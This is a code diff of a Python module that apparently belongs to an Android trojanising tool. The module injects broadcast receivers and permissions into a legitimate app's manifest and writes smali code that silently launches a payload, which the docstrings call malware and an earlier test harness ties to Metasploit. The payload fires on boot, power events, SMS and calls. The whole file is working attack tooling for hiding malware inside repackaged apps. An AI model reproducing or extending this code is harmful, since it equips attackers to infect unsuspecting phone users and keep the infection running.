@@ -6,39 +6,33 @@ import xml.etree.ElementTree as ET
 
 #gloab variables
 receiver_count = 0
-path = ""
-#on_power_connected
-opc = False
-#on_power_disconnected
-opdc = False
-#on_boot_completed
-obc = False
-#on_receive_sms
-ors = False
-#on_incoming_call
-oic = False
-#on_outgoing_call
-ooc = False
 
 
 def __fix_manifest(manifest_path, package, actions):
     """
-    Fixes the AndroidManifest.xml dependent on the specified hooks. Adds neede permissions. Adds needed receiver.
+    Fixes the AndroidManifest.xml dependent on the specified hooks. Adds needed permissions and needed receivers to the Manifest.
+
+    :param manifest_path: path to the Android Manifest of the original apk
+    :type manifest_path: str
+
+    :param package: The package name where the smali file of the Broadcastreceiver will be stored later
+    :type package: str
+
+    :param actions: These are the supported Broadcasts
+    :type package: list
 
     :return 
-    Name of the used class which catches the broadcast.
     """
     global receiver_count
+    # possible that we need more than one BroadcastLauncher -> count them
     broadcast_class = "BroadcastLauncher" + str(receiver_count)
     receiver_count += 1
 
-    print(broadcast_class)
-    print(package)
-    print(actions)
 
-    # inject receiver:
+    # generate receiver:
     rec = ('        <receiver android:name="' + package.replace("/",".") + '.' + broadcast_class +'">\n            <intent-filter>\n').replace("..", ".")
     
+    #there might be additional permissions needed for accessed specific Broadcasts
     permissions = []
     for a in actions:
         if a == "on_power_connected":
@@ -60,34 +54,38 @@ def __fix_manifest(manifest_path, package, actions):
 
     rec += '            </intent-filter>\n        </receiver>'
 
-    print(rec)
+    # add the receiver to the manifest
     manifest_changer.add_receiver(manifest_path, rec)
-    # add permissions
-    print manifest_path
-    print permissions
+    # add the permissions to the manifest
     manifest_changer.add_permissions_to_manifest(manifest_path, permissions)
 
+    #method __inject_smali needs the class name
     return broadcast_class
 
 
-def __inject_smali(payload_apk_path, filename, package, classname, methodname):
+def __inject_smali(payload_dec_path, filename, package, classname, methodname):
     """
-    Generates the smali code for the broadcast receiver based on given package, classname and methodname
+    Generates the smali code for the broadcast receiver. Furthermore, this method makes a static call to the payload based on given package, classname and methodname
     
-    :param package: The pakcage where the broadcastreceiver is placed. It is recommended to place the broadcast receiver in the same folder as the payload, but it is not mandatory
+    :param payload_dec_path: Path to the decompiled payload
+    :type payload_dec_path: str
+
+    :param filename: Name of the class which was specified in the manifest
+    :type filename: str
+
+    :param package: The package where the broadcastreceiver is placed.
     :type package: str
 
     :param classname: The class in the payload (malware) on which the static method is called
     :type classname: str
 
-    :param hooks: The static method which is called to launch the payload (malware)
-    :type hooks: str
+    :param methodname: The static method which is called to launch the payload (malware)
+    :type methodname: str
 
     :return
     pass
     """
-
-    global path
+    # this section is generating a Broadcast recei
     smali = (".class public L" + package.replace(".","/") + "/" + filename + ";\n").replace("//", "/")
     # remove from line 2: .source "BroadcastLauncher.java"
     smali += """.super Landroid/content/BroadcastReceiver;
@@ -111,28 +109,20 @@ def __inject_smali(payload_apk_path, filename, package, classname, methodname):
     .param p1, "context"    # Landroid/content/Context;
     .param p2, "intent"    # Landroid/content/Intent;\n"""
 
+    # add the static call to the payload
     # The parameter is always the context since a payload (malware does not need any other parameters of the original application)
-    invoke = ("    invoke-static {p1}, L" +  classname.replace(".", "/") + ";->" + methodname + "(Landroid/content/Context;)V\n").replace("//","/")
-    smali += invoke
+    smali += ("    invoke-static {p1}, L" +  classname.replace(".", "/") + ";->" + methodname + "(Landroid/content/Context;)V\n").replace("//","/")
 
     smali += """    .prologue
     .line 12
     return-void
 .end method"""
 
-    print(smali)
-    
-    # need to put the classes to the payload. packer copies it then to the original apk in the repack process
-    print(payload_apk_path + "/smali/" + package.replace(".","/") + "/" + filename + ".smali")
-    with open(payload_apk_path + "/smali/" + package.replace(".","/") + "/" + filename + ".smali","w") as f:
+    # Places the smali file to the decompiled payload. All the smali files are copied by the packer    
+    with open(payload_dec_path + "/smali/" + package.replace(".","/") + "/" + filename + ".smali","w") as f:
         f.write(smali)
 
-def __generate_hook(item, original_manifest_path, payload_manifest_path):
-    tree = ET.parse(payload_manifest_path)
-    root = tree.getroot()
-    payload_package = root.attrib['package']
-    filename = __fix_manifest(original_manifest_path, payload_package, item[1])
-    __inject_smali(item[0][3], filename, payload_package, item[0][0], item[0][1])
+
 
 
 def inject_broadcast_receiver_hooks(hooks, original_apk_path):
@@ -142,50 +132,23 @@ def inject_broadcast_receiver_hooks(hooks, original_apk_path):
     :param hooks: list of hook objects
     :type hooks: list
 
+    :param original_apk_path: path to the original apl
+    :type original_apk_path: str
+
     :return
     """
-    global path, obc, opdc, opc, ors, oic, ooc
-
 
     hook_overview = defaultdict(list)
     for h in hooks:
         if h.get_type() != "broadcast_receiver":
             print("Broadcast hook got hook object which is no broadcast_receiver")
             continue
-        print(h)
+        #class includes full package
         key = (h.get_class(), h.get_method(), h.get_payload_apk_path(), h.get_payload_dec_path())
         hook_overview[key].append(h.get_location())
 
-#        hook_type = h.get_location()
-#        if hook_type == "on_power_connected":
-#            opc = True
-#        elif hook_type == "on_power_disconnected":
-#            opdc = True
-#        elif hook_type == "on_boot_completed":
-#            obc = True
-#        elif hook_type == "on_receive_sms":
-#            ors = True
-#        elif hook_type == "on_incoming_call":
-#            oic = True
-#        elif hook_type == "on_outgoing_call":
-#            ooc = True
     original_manifest_path = (original_apk_path + "/" + "AndroidManifest.xml").replace("//", "/")
-    print(hook_overview.items())
     for h in hook_overview.items():
-        payload_manifest_path = (h[0][3] + "/" + "AndroidManifest.xml").replace("//", "/")
-
-        __generate_hook(h, original_manifest_path, payload_manifest_path)
-
-    
-
-#def main():
-#    h1 = Hook("broadcast_receiver", "on_power_connected", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
-#    h2 = Hook("broadcast_receiver", "on_power_disconnected", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
-#    h3 = Hook("broadcast_receiver", "on_boot_completed", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
-#    h4 = Hook("broadcast_receiver", "on_outgoing_call", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
-#    h5 = Hook("broadcast_receiver", "on_receive_sms", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
-#    h6 = Hook("broadcast_receiver", "on_incoming_call", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
-#
-#    inject_broadcast_hooks([h1,h2,h3,h4,h5,h6])
-#
-#main()
+        payload_package = ".".join(h[0][0].split(".")[:-1])
+        filename = __fix_manifest(original_manifest_path, payload_package, h[1])
+        __inject_smali(h[0][3], filename, payload_package, h[0][0], h[0][1])
